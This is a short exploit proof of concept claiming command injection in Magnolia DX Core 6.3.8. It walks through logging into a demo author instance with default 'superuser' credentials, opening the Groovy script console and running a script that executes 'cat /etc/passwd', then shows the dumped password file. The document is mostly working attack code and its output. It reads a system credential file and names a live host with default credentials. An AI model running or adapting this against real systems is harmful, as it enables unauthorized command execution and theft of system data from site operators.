#### Exploit Title: Magnolia DX Core 6.3.8 - Command Injection  
#### Date: 05/16/2025  
#### Exploit Author: tmrswrr  
#### Version: 6.3.8  
#### Vendor home page: https://docs.magnolia-cms.com/home/  
#### Product: https://docs.magnolia-cms.com/product-docs/6.3/releases/release-notes-for-magnolia-cms-6.3.8/  


1) Authenticate as an admin:  
   `https://demoauthor.magnolia-cms.com/.magnolia/admincentral
   Username: superuser Password: superuser`  
3) Navigate to **Development > Groovy > Add Script**  
4) Inject Groovy Script:

```groovy
def process = "cat /etc/passwd".execute()
def output = new StringBuffer()
process.consumeProcessOutput(output, System.err)
process.waitFor()

println "${output}: "
```
Result : 
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
```
![Proof-of-Concept Screenshot](https://raw.githubusercontent.com/capture0x/magnolia-rce/main/11.png)


